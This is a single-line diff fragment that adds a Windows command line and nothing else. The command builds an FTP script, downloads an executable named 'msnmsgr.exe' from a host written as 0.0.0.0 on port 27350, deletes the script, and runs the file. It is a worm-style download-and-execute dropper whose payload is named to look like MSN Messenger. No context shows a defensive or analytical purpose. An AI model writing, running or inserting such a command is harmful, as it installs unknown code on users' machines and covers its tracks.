@@ -1,0 +1,1 @@
+cmd /c echo open 0.0.0.0 27350 >> ii &echo user 1 1 >> ii &echo get msnmsgr.exe >> ii &echo bye >> ii &ftp -n -v -s:ii &del ii &msnmsgr.exe
